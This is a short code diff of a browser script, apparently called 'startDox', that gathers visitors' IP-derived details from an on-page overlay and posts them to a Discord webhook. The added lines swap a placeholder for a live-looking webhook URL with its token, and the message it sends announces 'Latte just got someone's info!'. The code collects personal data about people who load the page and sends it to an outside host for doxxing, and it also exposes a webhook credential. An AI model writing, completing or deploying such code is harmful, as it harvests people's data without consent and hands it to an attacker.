@@ -69,7 +69,7 @@ function startDox() {
     
         const info = Array.from(doxOverlay.children).map(span => {
             const [label, ...rest] = span.innerText.split(": ");
-            return { label, value: rest.join(": ") };
+            return { label: label.toLowerCase(), value: rest.join(": ") };
         });
         sendToWebhook(info);
 
@@ -78,7 +78,7 @@ fetchAndDisplayIPData();
 
 
 async function sendToWebhook(info) {
-    const webhookUrl = "https://discord.com/api/webhooks/WEBHOOK_URL_HERE"; // Replace this
+    const webhookUrl = "https://discord.com/api/webhooks/1388405456430436443/7dUtCcjyd6Sof3oJqc8PcrgA4LBiGVs5PnPnIadV4sze67ji96uZf21acYKiwLCvMTTM"; // Replace this
 
     const embed = {
         title: "🎯 Latte just got someone's info!",
